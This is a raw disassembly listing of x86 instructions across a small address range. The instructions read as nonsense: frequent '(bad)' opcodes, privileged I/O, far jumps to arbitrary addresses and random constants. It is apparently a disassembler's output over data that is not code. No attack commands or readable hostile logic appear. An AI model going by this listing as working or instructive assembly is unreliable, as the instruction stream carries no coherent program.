  42e898:	jb     0x42e86a
  42e89a:	mov    ebx,0x4278e6ce
  42e89f:	jg     0x42e85e
  42e8a1:	dec    ebx
  42e8a2:	dec    eax
  42e8a3:	pop    eax
  42e8a4:	ret    0x8563
  42e8a7:	mov    DWORD PTR [edx-0x2a],ebp
  42e8aa:	aad    0x5
  42e8ac:	or     al,0x9b
  42e8ae:	loopne 0x42e85c
  42e8b0:	fst    QWORD PTR fs:[eax]
  42e8b3:	pop    ds
  42e8b4:	imul   esp,DWORD PTR [ebx+0x69],0x23
  42e8b8:	pop    ecx
  42e8b9:	imul   eax,DWORD PTR ds:0xceaa2895,0x60401d
	...
  42e933:	add    cl,bh
  42e935:	mov    cl,0x70
  42e937:	dec    eax
  42e938:	js     0x42e903
  42e93a:	stc    
  42e93b:	mov    cl,0x3
  42e93d:	push   ds
  42e93e:	nop
  42e93f:	aad    0x4b
  42e941:	pop    ebp
  42e942:	push   ebx
  42e943:	jno    0x42e91d
  42e945:	in     al,dx
  42e946:	add    DWORD PTR [eax],eax
  42e948:	test   BYTE PTR [eax],0x0
  42e94b:	add    BYTE PTR [esi+0x4f0b972f],cl
  42e951:	jle    0x42e927
  42e953:	mov    cs,WORD PTR ds:0xeab7af80
  42e959:	and    DWORD PTR [eax+ecx*4],0xfffffff4
  42e95d:	(bad)  
  42e95e:	mov    dl,0xde
  42e960:	or     esi,esp
  42e962:	inc    ebp
  42e963:	jg     0x42e94c
  42e965:	mov    ebp,0xb30eedcb
  42e96a:	pop    ss
  42e96b:	pop    esi
  42e96c:	dec    edi
  42e96d:	fldcw  WORD PTR [ebx-0x614a0e17]
  42e973:	fisttp WORD PTR [edx]
  42e975:	outs   dx,BYTE PTR ds:[esi]
  42e976:	jmp    0x4c97:0xa38c77b4
  42e97d:	push   0xae2247ee
  42e982:	pop    ss
  42e983:	int    0x1b
  42e985:	cli    
  42e986:	mov    esi,0xc39cf5ea
  42e98b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e98c:	int    0x79
  42e98e:	jp     0x42e9b1
  42e990:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e991:	mov    ds:0x460867e5,al
  42e996:	mov    fs,WORD PTR [ecx-0x54]
  42e999:	fcom   QWORD PTR [eax]
  42e99b:	dec    esp
  42e99c:	psraw  mm7,QWORD PTR [esi]
  42e99f:	mov    ah,ch
  42e9a1:	lock lea edi,ds:0x4907aa0c
  42e9a8:	aas    
  42e9a9:	cld    
  42e9aa:	mov    dh,0x91
  42e9ac:	jge    0x42e9dc
  42e9ae:	jmp    0xd6bd32e0
  42e9b3:	pop    edx
  42e9b4:	dec    esp
  42e9b5:	mov    ds:0xf1a8b482,al
  42e9ba:	adc    al,0x4f
  42e9bc:	mov    bh,0xbc
  42e9be:	ja     0x42ea28
  42e9c0:	ss push eax
  42e9c2:	repz ret 
  42e9c4:	push   edi
  42e9c5:	jmp    0x42e9b5
  42e9c7:	outs   dx,DWORD PTR ds:[esi]
  42e9c8:	dec    esp
  42e9c9:	lds    edi,FWORD PTR ss:0x85d2726d
  42e9d0:	pop    ds
  42e9d1:	mov    eax,ds:0x6783a5cc
  42e9d6:	(bad)  
  42e9d7:	iret   
  42e9d8:	pop    ss
  42e9d9:	test   DWORD PTR [ebx+0x9595ac3],ecx
  42e9df:	xor    al,0xfa
  42e9e1:	pop    edi
  42e9e2:	mov    bl,0x90
  42e9e4:	jl     0x42e9c0
  42e9e6:	in     eax,0xf1
  42e9e8:	add    ebx,DWORD PTR [edi+ebp*8]
  42e9eb:	xchg   edx,eax
  42e9ec:	xor    eax,0x4631fcd1
  42e9f1:	pop    es
  42e9f2:	cmc    
  42e9f3:	xrelease xchg DWORD PTR [edi],ecx
  42e9f6:	push   cs
  42e9f7:	mov    eax,0xba8881e7
  42e9fc:	aam    0x80
  42e9fe:	mov    ds:0x3ae2ab61,al
  42ea03:	aad    0x93
  42ea05:	outs   dx,BYTE PTR ds:[esi]
  42ea06:	mov    dh,0x5e
  42ea08:	or     bl,BYTE PTR ds:0xeae5d205
  42ea0e:	in     al,dx
  42ea0f:	leave  
  42ea10:	dec    ebp
  42ea11:	mov    ah,0xa2
  42ea13:	mov    edi,0x303b9f96
  42ea18:	sbb    eax,0x9e75cc63
  42ea1d:	(bad)  
  42ea1e:	lds    ebx,FWORD PTR [esi+0x1b]
  42ea21:	add    dh,dl
  42ea23:	push   eax
  42ea24:	push   ss
  42ea25:	outs   dx,DWORD PTR ds:[esi]
  42ea26:	sbb    ebx,DWORD PTR [edx]
  42ea28:	ss pop edi
  42ea2a:	loop   0x42ea7c
  42ea2c:	(bad)  
  42ea2d:	xor    bh,ah
  42ea2f:	cmp    dl,dl
  42ea31:	pop    ebp
  42ea32:	sbb    al,BYTE PTR [ebx-0x24f85637]
  42ea38:	and    BYTE PTR [ebx],0x94
  42ea3b:	jg     0x42ea2d
  42ea3d:	adc    eax,0xf35578f6
	...
  42eab2:	add    BYTE PTR [eax],al
  42eab4:	mov    al,0x7a
  42eab6:	pop    ds
  42eab7:	ins    BYTE PTR es:[edi],dx
  42eab8:	fild   QWORD PTR [ebp-0xd]
  42eabb:	dec    BYTE PTR [ebx]
  42eabd:	add    ah,BYTE PTR [ebp-0x48]
  42eac0:	inc    eax
  42eac1:	mov    WORD PTR [edi],?
  42eac3:	hlt    
  42eac4:	into   
  42eac5:	in     eax,dx
  42eac6:	add    DWORD PTR [eax],eax
  42eac8:	test   BYTE PTR [eax],0x0
  42eacb:	add    BYTE PTR [esi-0x31286ece],dl
  42ead1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ead2:	push   cs
  42ead3:	mov    al,0x9d
  42ead5:	or     al,0x5a
  42ead8:	sub    al,0xa7
  42eada:	fist   WORD PTR [ecx+0x2c38310]
  42eae0:	shl    DWORD PTR ds:0xac3e4e1c,1
  42eae6:	mov    eax,0x31f73be3
  42eaeb:	cmc    
  42eaec:	pop    edi
  42eaed:	sub    BYTE PTR [edi+0x351e3363],dh
  42eaf3:	addr16 xchg esp,eax
  42eaf5:	sti    
  42eaf6:	push   esi
  42eaf7:	data16 jo 0x42eb03
  42eafa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42eafb:	push   ebx
  42eafc:	and    dl,BYTE PTR [edx+0x25]
  42eaff:	call   0x3140:0xbb24af0e
  42eb06:	or     DWORD PTR [esi+0x231c9052],ebp
  42eb0c:	sar    DWORD PTR [ebx-0x45],0x82
  42eb10:	or     cl,BYTE PTR [esi]
  42eb12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eb13:	dec    BYTE PTR [ebx+0x120e6ac1]
  42eb19:	jmp    0xb49:0x93763851
  42eb20:	add    al,0x1f
  42eb22:	or     BYTE PTR [eax],dh
  42eb24:	imul   eax,edx,0xc6359fd2
  42eb2a:	fild   DWORD PTR [ecx+0x74]
  42eb2d:	mov    dh,0xb5
  42eb2f:	cmp    al,0x82
  42eb31:	ins    BYTE PTR es:[edi],dx
  42eb32:	and    al,0x1b
  42eb34:	jg     0x42eb74
  42eb36:	and    eax,0xe36c8965
  42eb3b:	add    esp,ebx
  42eb3d:	pop    esi
  42eb3e:	or     dh,BYTE PTR [esi-0x3489dabf]
  42eb44:	retf   
  42eb45:	push   ebp
  42eb46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42eb47:	loop   0x42eacd
  42eb49:	scas   eax,DWORD PTR es:[edi]
  42eb4a:	test   edx,esp
  42eb4c:	mov    ch,0xbb
  42eb4e:	adc    ch,ch
  42eb50:	ins    DWORD PTR es:[edi],dx
  42eb51:	dec    edi
  42eb52:	adc    eax,0xe55adb89
  42eb57:	lods   eax,DWORD PTR ds:[esi]
  42eb58:	loopne 0x42ebb5
  42eb5a:	push   esi
  42eb5b:	or     eax,0x74d2878a
  42eb60:	lods   al,BYTE PTR ds:[esi]
  42eb61:	je     0x42ebba
  42eb63:	inc    eax
  42eb64:	cmp    BYTE PTR [esp+ecx*8-0x2c],al
  42eb68:	dec    esi
  42eb69:	jmp    0xafbc:0x35506b16
  42eb70:	pop    ss
  42eb71:	sub    dh,bh
  42eb73:	mov    edi,0xb2eceb33
  42eb78:	lahf   
  42eb79:	es in  eax,0x89
  42eb7c:	xchg   esi,eax
  42eb7d:	test   BYTE PTR [edx+0x1d],dl
  42eb80:	stos   BYTE PTR es:[edi],al
  42eb81:	iret   
  42eb82:	fs retf 0x3f2b
  42eb86:	std    
  42eb87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42eb88:	nop
  42eb89:	test   al,0xc3
  42eb8b:	xchg   ecx,eax
  42eb8c:	scas   al,BYTE PTR es:[edi]
  42eb8d:	xchg   edx,eax
  42eb8e:	cli    
  42eb8f:	sub    edx,DWORD PTR [ecx+eiz*4]
  42eb92:	arpl   WORD PTR [esi+0x2a35ef37],sp
  42eb98:	mov    WORD PTR [ecx+esi*2],fs
  42eb9b:	mov    ecx,0x7d78fb23
  42eba0:	mov    esi,0xaa935f0e
  42eba5:	loopne 0x42eb6c
  42eba7:	xchg   bl,cl
  42eba9:	jmp    0x49266a94
  42ebae:	cmp    ebx,esp
  42ebb0:	rcr    BYTE PTR [eax+0x294dc6dd],0x67
  42ebb7:	pop    ebp
  42ebb8:	or     eax,0x99141f6b
  42ebbd:	push   0xffffff85
  42ebbf:	cmp    eax,0x6fe9
	...
  42ec34:	cmp    DWORD PTR [edi-0x2010f093],esi
  42ec3a:	jnp    0x42ebf3
  42ec3c:	sbb    cl,BYTE PTR [edi+edx*4+0x5280d369]
  42ec43:	aas    
  42ec44:	(bad)  
  42ec45:	out    dx,al
  42ec46:	add    DWORD PTR [eax],eax
  42ec48:	test   BYTE PTR [eax],0x0
  42ec4b:	add    BYTE PTR [ebx],dl
  42ec4d:	inc    edi
  42ec4e:	mov    edx,0x24309c6a
  42ec53:	jp     0x42eca7
  42ec55:	jo     0x42ecb0
  42ec57:	xor    al,0xcd
  42ec59:	xchg   ebp,eax
  42ec5a:	shr    BYTE PTR [ebx],1
  42ec5c:	inc    edx
  42ec5d:	mov    eax,ds:0x638c37f0
  42ec62:	mov    al,0x3a
  42ec64:	dec    eax
  42ec65:	popa   
  42ec66:	pop    esp
  42ec67:	mov    al,0xc6
  42ec69:	cmp    BYTE PTR [ecx-0x5c],cl
  42ec6c:	mov    al,ds:0x989b273e
  42ec71:	add    DWORD PTR [edx+0x25],esp
  42ec74:	fbld   TBYTE PTR [ebx+0x50]
  42ec77:	test   esi,eax
  42ec79:	mov    ebp,0x3748a592
  42ec7e:	fnstcw WORD PTR [esp+edi*2-0x7c]
  42ec82:	or     DWORD PTR [ebx+0x6e52c724],eax
  42ec88:	std    
  42ec89:	inc    edi
  42ec8a:	mov    al,ds:0xdf9670c4
  42ec8f:	in     eax,dx
  42ec90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ec91:	mov    bh,0xfa
  42ec93:	pop    edi
  42ec94:	nop
  42ec95:	cs and eax,0x713a7679
  42ec9b:	sbb    al,0xd8
  42ec9d:	das    
  42ec9e:	sub    cl,BYTE PTR ds:0x152bcca0
  42eca4:	fdivrp st(1),st
  42eca6:	test   BYTE PTR ds:0x42dd,0x9d
  42ecac:	idiv   BYTE PTR [ecx+0x6]
  42ecaf:	inc    ecx
  42ecb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ecb1:	daa    
  42ecb2:	ins    DWORD PTR es:[edi],dx
  42ecb3:	out    0x56,al
  42ecb5:	push   ebx
  42ecb6:	inc    esp
  42ecb7:	jl     0x42ec70
  42ecb9:	sti    
  42ecba:	mov    esi,0xb9b69f61
  42ecbf:	sub    al,BYTE PTR [edx+edi*2+0x78fff15e]
  42ecc6:	mov    dl,0x34
  42ecc8:	mov    es,eax
  42ecca:	push   edx
  42eccb:	cmp    eax,0x2d86703d
  42ecd0:	or     al,0x69
  42ecd2:	call   0x9ac6b54
  42ecd7:	xor    DWORD PTR ds:0xb7c20a56,esi
  42ecdd:	leave  
  42ecde:	fimul  WORD PTR [ecx-0x47]
  42ece1:	gs (bad) 
  42ece3:	mov    edi,0x8e19b69
  42ece8:	mov    eax,0xbbdf15a5
  42eced:	xchg   ebx,eax
  42ecee:	pop    edi
  42ecef:	(bad)  
  42ecf0:	popa   
  42ecf1:	or     eax,ebp
  42ecf3:	imul   ecx,DWORD PTR [ebp+0x1d],0xffffffd1
  42ecf7:	add    DWORD PTR [esp+edi*8+0xe],esi
  42ecfb:	int3   
  42ecfc:	out    dx,al
  42ecfd:	mov    edx,0xc6f2d4e
  42ed02:	ret    0x1452
  42ed05:	inc    eax
  42ed06:	stos   BYTE PTR es:[edi],al
  42ed07:	pop    edx
  42ed08:	pop    eax
  42ed09:	sub    bl,al
  42ed0b:	sub    DWORD PTR [esi+0x11],ebx
  42ed0e:	sti    
  42ed0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ed10:	add    DWORD PTR [eax-0x547d5cc3],edi
  42ed16:	rcl    DWORD PTR [esi-0x57740f30],cl
  42ed1c:	and    eax,0xc9ebd065
  42ed21:	xlat   BYTE PTR ds:[ebx]
  42ed22:	outs   dx,BYTE PTR ds:[esi]
  42ed23:	fisttp DWORD PTR [ecx]
  42ed25:	cmp    dh,ch
  42ed27:	xor    DWORD PTR [ecx-0x7629c56e],edx
  42ed2d:	es fwait
  42ed2f:	mov    ebx,0x178294a5
  42ed34:	inc    edx
  42ed35:	pop    ds
  42ed36:	inc    ebx
  42ed37:	ror    dl,cl
  42ed39:	ja     0x42ecdc
  42ed3b:	xlat   BYTE PTR ds:[ebx]
  42ed3c:	pop    ss
  42ed3d:	and    DWORD PTR [ecx-0x58],esi
  42ed40:	cmc    
  42ed41:	mov    eax,ds:0x0
	...
  42edb2:	add    BYTE PTR [eax],al
  42edb4:	out    0x82,al
  42edb6:	lods   eax,DWORD PTR ds:[esi]
  42edb7:	xor    ebp,ebp
  42edb9:	aas    
  42edba:	(bad)  
  42edbb:	xlat   BYTE PTR ds:[ebx]
  42edbc:	jmp    0x42ed84
  42edbe:	popa   
  42edbf:	test   eax,0x5136ce0f
  42edc4:	mov    edx,0xf60001ef
  42edc9:	add    BYTE PTR [eax],al
  42edcb:	add    BYTE PTR [eax-0x16],ah
  42edce:	jmp    0x180b660d
  42edd3:	pop    edi
  42edd4:	mov    al,BYTE PTR [ecx+0x6a]
  42edd7:	inc    esp
  42edd8:	arpl   WORD PTR [eax+0x72],si
  42eddb:	lods   eax,DWORD PTR ds:[esi]
  42eddc:	add    dl,BYTE PTR [eax-0x4d]
  42eddf:	pop    ss
  42ede0:	pop    es
  42ede1:	jge    0x42edac
  42ede3:	(bad)  [ebx-0x6b75ce0d]
  42ede9:	test   ah,0x3a
  42edec:	bound  ecx,QWORD PTR [ecx-0x2db91fd7]
  42edf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42edf3:	shl    BYTE PTR cs:[esi],cl
  42edf6:	cmp    ch,BYTE PTR [ebx-0x587b41c2]
  42edfc:	pop    ebx
  42edfd:	std    
  42edfe:	ss adc al,0x5a
  42ee01:	bound  ebx,QWORD PTR [ebx-0x12d125bc]
  42ee07:	cmp    dh,dl
  42ee09:	(bad)  
  42ee0b:	adc    al,0x73
  42ee0d:	xor    DWORD PTR [ebx-0x41],ecx
  42ee10:	push   esi
  42ee11:	mov    bh,0xb7
  42ee13:	pslld  mm4,QWORD PTR [esp+eax*4+0x61]
  42ee18:	cmp    eax,0x5d902953
  42ee1d:	fld    TBYTE PTR [ebp-0x5d]
  42ee20:	jle    0x42edf8
  42ee22:	mov    ebx,0x8885221f
  42ee27:	mov    esi,0x41089730
  42ee2c:	ins    BYTE PTR es:[edi],dx
  42ee2d:	mov    esp,0xefa15cc7
  42ee32:	mov    eax,ds:0x3f4926c7
  42ee37:	push   ebp
  42ee38:	addr16 lock mov edi,0xc2fa7da6
  42ee3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ee40:	cs jecxz 0x42ee1a
  42ee43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ee44:	jns    0x42edc6
  42ee46:	cs sub al,0x1a
  42ee49:	inc    ecx
  42ee4a:	mov    edx,0x3a48247f
  42ee4f:	popa   
  42ee50:	shr    BYTE PTR [edi],cl
  42ee52:	stc    
  42ee53:	sub    edx,DWORD PTR [esi+0x47ffe36e]
  42ee59:	int3   
  42ee5a:	adc    DWORD PTR [ecx+0x94ac7df],ecx
  42ee60:	inc    esi
  42ee61:	out    dx,eax
  42ee62:	jo     0x42ee9f
  42ee64:	sub    eax,0xb831bc72
  42ee69:	pop    edx
  42ee6a:	mov    ch,0xa9
  42ee6c:	imul   ebp,DWORD PTR [ebp+0x1210e1fe],0x73
  42ee73:	cmp    BYTE PTR ds:0x7ae8c7d2,0x33
  42ee7a:	mov    cl,cl
  42ee7c:	dec    esi
  42ee7d:	adc    dl,BYTE PTR [edi]
  42ee7f:	sub    ecx,DWORD PTR [esi]
  42ee81:	pop    edi
  42ee82:	cmp    al,BYTE PTR [ebp-0x5e]
  42ee85:	jbe    0x42eeda
  42ee87:	xor    eax,0x1600c216
  42ee8c:	mov    eax,ds:0xee56b522
  42ee91:	xchg   ecx,eax
  42ee92:	test   al,0x3f
  42ee94:	inc    eax
  42ee95:	adc    DWORD PTR [edi+edx*4-0x41926ee6],ebx
  42ee9c:	in     al,dx
  42ee9d:	mov    BYTE PTR [ecx-0x11cacebe],bl
  42eea3:	push   DWORD PTR [edx+0x7e]
  42eea6:	loope  0x42eeb6
  42eea8:	pop    edi
  42eea9:	daa    
  42eeaa:	scas   al,BYTE PTR es:[edi]
  42eeab:	adc    DWORD PTR [edi-0x3e],esi
  42eeae:	and    DWORD PTR [edi+esi*1],0xd98c3447
  42eeb5:	push   esi
  42eeb6:	test   al,0x7c
  42eeb8:	sbb    ebx,DWORD PTR [ebp-0x76]
  42eebb:	mov    eax,0xd089dc0b
  42eec0:	add    dh,cl
	...
  42ef32:	add    BYTE PTR [eax],al
  42ef34:	add    bh,dh
  42ef36:	jb     0x42eede
  42ef38:	(bad)  
  42ef39:	scas   al,BYTE PTR es:[edi]
  42ef3a:	(bad)  
  42ef3b:	(bad)  
  42ef3c:	cmp    DWORD PTR [edi],edi
  42ef3e:	int3   
  42ef3f:	repnz (bad) 
  42ef41:	aam    0x1c
  42ef43:	or     dh,BYTE PTR [eax-0x9fffe10]
  42ef49:	add    BYTE PTR [eax],al
  42ef4b:	add    BYTE PTR [ecx-0x2d032d54],dh
  42ef51:	popa   
  42ef52:	cdq    
  42ef53:	int3   
  42ef54:	and    edi,DWORD PTR [eax+0x7caa98c9]
  42ef5a:	clc    
  42ef5b:	xor    al,0x4c
  42ef5d:	mov    eax,ds:0x75b5ec6b
  42ef62:	jo     0x42ef5f
  42ef64:	xchg   ecx,eax
  42ef65:	inc    ebx
  42ef66:	call   0x8652:0x76782120
  42ef6d:	mov    ebp,0x965990e3
  42ef72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ef73:	(bad)  
  42ef74:	dec    esi
  42ef75:	xchg   ebx,eax
  42ef76:	test   eax,0xed36a6eb
  42ef7b:	push   ecx
  42ef7c:	repnz xchg ebx,eax
  42ef7e:	cmp    al,0x15
  42ef80:	xchg   edi,eax
  42ef81:	pop    ss
  42ef82:	add    BYTE PTR [ebp-0x54],ah
  42ef85:	and    eax,0xfa904132
  42ef8a:	push   edi
  42ef8b:	call   0xcf4fb3aa
  42ef90:	and    eax,esp
  42ef92:	pop    ecx
  42ef93:	cld    
  42ef94:	fsub   st(4),st
  42ef96:	mov    dh,0xb6
  42ef98:	push   eax
  42ef99:	test   eax,0x3240d2d6
  42ef9e:	data16 lahf 
  42efa0:	iret   
  42efa1:	xor    al,0xa0
  42efa3:	pop    edi
  42efa4:	data16 sub al,0xee
  42efa7:	popa   
  42efa8:	(bad)  
  42efa9:	xor    ecx,DWORD PTR [ecx]
  42efab:	add    eax,DWORD PTR [eax-0x713eea6e]
  42efb1:	sub    ah,ch
  42efb3:	inc    edx
  42efb4:	mov    al,ds:0x707a4caa
  42efb9:	or     ah,BYTE PTR [ebx]
  42efbb:	or     edi,esi
  42efbd:	and    edi,DWORD PTR [ecx-0x46302f9b]
  42efc3:	jl     0x42efd9
  42efc5:	adc    al,0x6e
  42efc7:	loope  0x42ef9b
  42efc9:	mov    ds:0xfd91191e,eax
  42efce:	inc    ecx
  42efcf:	jno    0x42f037
  42efd1:	std    
  42efd2:	ins    DWORD PTR es:[edi],dx
  42efd3:	sahf   
  42efd4:	sbb    DWORD PTR [edx-0x6894fb8a],0xec53bf9
  42efde:	js     0x42ef8e
  42efe0:	inc    edx
  42efe1:	pop    edx
  42efe2:	scas   eax,DWORD PTR es:[edi]
  42efe3:	mov    ds:0xd54b9d1b,eax
  42efe8:	dec    ebx
  42efe9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42efea:	sub    bl,BYTE PTR [eax+0x3b]
  42efed:	in     eax,dx
  42efee:	jp     0x42efc3
  42eff0:	xchg   esi,eax
  42eff1:	sti    
  42eff2:	jns    0x42efda
  42eff4:	stos   BYTE PTR es:[edi],al
  42eff5:	cmp    edi,DWORD PTR [edi-0x71]
  42eff8:	jp     0x42f019
  42effa:	xor    eax,0x97b342eb
  42efff:	jle    0x42f04d
  42f001:	pmaddwd mm3,QWORD PTR [edx]
  42f004:	js     0x42eff2
  42f006:	in     eax,0xe4
  42f008:	jle    0x42efdc
  42f00a:	adc    cl,BYTE PTR [ebx-0x3f]
  42f00d:	sub    al,0xb
  42f00f:	arpl   WORD PTR [ecx+0x72],cx
  42f012:	or     ah,ch
  42f014:	(bad)  
  42f015:	(bad)  
  42f016:	addr16 aam 0xcf
  42f019:	xor    esp,DWORD PTR [ecx+eax*8-0x18]
  42f01d:	cmp    edi,DWORD PTR [edx+0x57]
  42f020:	push   edi
  42f021:	cmp    al,0x9
  42f023:	push   0xe
  42f025:	pop    esi
  42f026:	sub    eax,0x3d5f2e0d
  42f02b:	lock fs imul esp,esi,0xfffffff5
  42f030:	adc    BYTE PTR [ecx-0x32],dl
  42f033:	js     0x42eff2
  42f035:	gs ffree st(2)
  42f038:	push   cs
  42f039:	mov    dl,0x6e
  42f03b:	lods   al,BYTE PTR ds:[esi]
  42f03c:	loopne 0x42f077
  42f03e:	jmp    0x7aba39
	...
  42f0b3:	add    BYTE PTR [ecx+0x7e061ecf],ah
  42f0b9:	xlat   BYTE PTR ds:[ebx]
  42f0ba:	mov    ecx,0xd7e009ef
  42f0bf:	bound  ecx,QWORD PTR [esi+eiz*1-0xe597724]
  42f0c6:	add    DWORD PTR [eax],eax
  42f0c8:	test   BYTE PTR [eax],0x0
  42f0cb:	add    cl,al
  42f0cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f0ce:	pushf  
  42f0cf:	xchg   edi,eax
  42f0d0:	lods   eax,DWORD PTR ds:[esi]
  42f0d1:	outs   dx,DWORD PTR ds:[esi]
  42f0d2:	xchg   esi,eax
  42f0d3:	push   cs
  42f0d4:	push   ss
  42f0d5:	xor    al,0xa9
  42f0d7:	shl    BYTE PTR [di+0x5f],cl
  42f0db:	ss sbb al,0xa7
  42f0de:	mov    eax,ds:0x7684d8bb
  42f0e3:	or     DWORD PTR [ecx+0x62],ebx
  42f0e6:	(bad)  
  42f0e7:	outs   dx,DWORD PTR ds:[esi]
  42f0e8:	sbb    BYTE PTR [edx-0x62],dh
  42f0eb:	xchg   DWORD PTR [edx],esp
  42f0ed:	sbb    eax,0xeb93c48c
  42f0f2:	jge    0x42f147
  42f0f4:	(bad)  
  42f0f5:	mov    ch,0x14
  42f0f7:	jmp    0x42f155
  42f0f9:	fist   WORD PTR [edx-0x341b856e]
  42f0ff:	retf   
  42f100:	pop    esi
  42f101:	rol    DWORD PTR [edx+0x571c78b],cl
  42f107:	fnstenv [edi+ecx*2+0x50]
  42f10b:	mov    dh,0xab
  42f10d:	add    bh,BYTE PTR [eax]
  42f10f:	mov    al,0xb5
  42f111:	fst    DWORD PTR ds:0xf261a15e
  42f117:	jns    0x42f164
  42f119:	inc    edi
  42f11a:	fst    QWORD PTR [esi-0x63]
  42f11d:	fidivr DWORD PTR [esi+0x406d9531]
  42f123:	and    BYTE PTR [edi-0x27],bl
  42f126:	gs cmc 
  42f128:	add    eax,0x52939c87
  42f12d:	adc    al,0x7
  42f12f:	mov    cl,0x25
  42f131:	sub    cl,dl
  42f133:	nop
  42f134:	mov    edi,DWORD PTR [ecx+edx*4+0x58a4a6eb]
  42f13b:	pushf  
  42f13c:	test   BYTE PTR [esi],bh
  42f13e:	xlat   BYTE PTR ds:[ebx]
  42f13f:	test   BYTE PTR [esi-0x7056d2a7],0x4
  42f146:	jns    0x42f182
  42f148:	fs daa 
  42f14a:	loopne 0x42f0f5
  42f14c:	jle    0x42f177
  42f14e:	inc    ebx
  42f14f:	push   eax
  42f150:	adc    BYTE PTR ds:0x4d368f47,cl
  42f156:	fisttp QWORD PTR [ebx-0x1]
  42f159:	adc    dh,dl
  42f15b:	mov    bl,0x64
  42f15d:	fisub  DWORD PTR cs:[ecx+eax*1+0x6e]
  42f162:	scas   al,BYTE PTR es:[edi]
  42f163:	dec    ebp
  42f164:	sahf   
  42f165:	add    eax,0x221aad09
  42f16a:	shl    DWORD PTR [esi-0x615c9d6d],cl
  42f170:	add    dh,BYTE PTR [edx]
  42f172:	inc    ebx
  42f173:	scas   al,BYTE PTR es:[edi]
  42f174:	ins    BYTE PTR es:[edi],dx
  42f175:	pusha  
  42f176:	dec    eax
  42f177:	ds and esi,eax
  42f17a:	in     eax,0xd6
  42f17c:	jae    0x42f16e
  42f17e:	inc    ebx
  42f17f:	adc    edx,DWORD PTR [edi]
  42f181:	or     DWORD PTR [eax],0x531f8c6c
  42f187:	dec    eax
  42f188:	loopne 0x42f17c
  42f18a:	leave  
  42f18b:	push   0xe
  42f18d:	or     al,0x43
  42f18f:	push   eax
  42f190:	xchg   ebp,eax
  42f191:	inc    esp
  42f192:	fdiv   DWORD PTR [edi]
  42f194:	push   esp
  42f195:	icebp  
  42f196:	fst    QWORD PTR ds:[esi-0x3a]
  42f19a:	(bad)  
  42f19b:	imul   ebp,DWORD PTR [edx-0x58],0x6d8b954f
  42f1a2:	out    dx,eax
  42f1a3:	pop    edi
  42f1a4:	push   edx
  42f1a5:	imul   ebx,DWORD PTR [eax-0x60e9676f],0xffffff97
  42f1ac:	xor    edx,esi
  42f1ae:	jns    0x42f16c
  42f1b0:	bound  eax,QWORD PTR ds:0xff58b916
  42f1b6:	add    DWORD PTR [ecx+0x5c],ebp
  42f1b9:	xchg   ebx,eax
  42f1ba:	jp     0x42f1e3
  42f1bc:	loope  0x42f14e
  42f1be:	pop    ds
  42f1bf:	fcomp  DWORD PTR [eax]
  42f1c1:	push   esp
	...
  42f232:	add    BYTE PTR [eax],al
  42f234:	lods   eax,DWORD PTR ds:[esi]
  42f235:	cmp    eax,0xb79aa78a
  42f23a:	lods   eax,DWORD PTR ds:[esi]
  42f23b:	aas    
  42f23c:	jp     0x42f245
  42f23e:	int3   
  42f23f:	icebp  
  42f240:	test   DWORD PTR [edx+edx*1],0x1f29cda
  42f247:	add    dh,dh
  42f249:	add    BYTE PTR [eax],al
  42f24b:	add    BYTE PTR [edi+0x7b],cl
  42f24e:	imul   ebp,esp,0xfffffff1
  42f251:	(bad)  
  42f252:	loopne 0x42f2a3
  42f254:	or     al,0x7
  42f256:	push   0x4b1a80bf
  42f25b:	fsubrp st(7),st
  42f25d:	sbb    ebp,DWORD PTR [esi+0x21]
  42f260:	sub    DWORD PTR [edx+0x23],ecx
  42f263:	jl     0x42f2e3
  42f265:	mov    bl,0x76
  42f267:	repz popf 
  42f269:	loope  0x42f267
  42f26b:	inc    esp
  42f26c:	loop   0x42f20f
  42f26e:	fdiv   DWORD PTR [edx+0x70]
  42f271:	push   ebp
  42f272:	test   DWORD PTR [edx+0x69],edi
  42f275:	jne    0x42f2e4
  42f277:	add    DWORD PTR [esi-0x42],esp
  42f27a:	xor    BYTE PTR [eax-0x6c3447a3],bh
  42f280:	push   0xffffffdb
  42f282:	sub    al,0x2a
  42f284:	xchg   esi,ecx
  42f286:	out    0xc6,eax
  42f288:	push   ds
  42f289:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f28a:	loop   0x42f272
  42f28c:	fnstenv [ebx-0x2]
  42f28f:	push   ecx
  42f290:	adc    DWORD PTR [edi-0x29],ebp
  42f293:	dec    ebx
  42f294:	sbb    DWORD PTR [eax+0x29],edx
  42f297:	(bad)  
  42f298:	cmp    al,0x44
  42f29a:	mov    ah,0x24
  42f29c:	aas    
  42f29d:	mov    ecx,0x889f685d
  42f2a2:	not    BYTE PTR [eax+edi*8+0x2eb5b7e0]
  42f2a9:	out    dx,al
  42f2aa:	jmp    0x6905:0xaa9d0b80
  42f2b1:	sahf   
  42f2b2:	ins    DWORD PTR es:[edi],dx
  42f2b3:	fnstcw WORD PTR [eax]
  42f2b5:	loop   0x42f27c
  42f2b7:	xor    edi,ebx
  42f2b9:	(bad)  ds:0x2a7b3dad
  42f2bf:	div    dl
  42f2c1:	shr    dh,cl
  42f2c3:	push   0xffffffbf
  42f2c5:	and    BYTE PTR [esi+ebx*1+0xb79b382],bl
  42f2cc:	mov    al,BYTE PTR es:[eax-0x3f]
  42f2d0:	pop    esp
  42f2d1:	repnz xchg ecx,eax
  42f2d3:	sub    BYTE PTR [ebx+0x19],dl
  42f2d6:	push   ss
  42f2d7:	push   edx
  42f2d8:	hlt    
  42f2d9:	push   ss
  42f2da:	push   edi
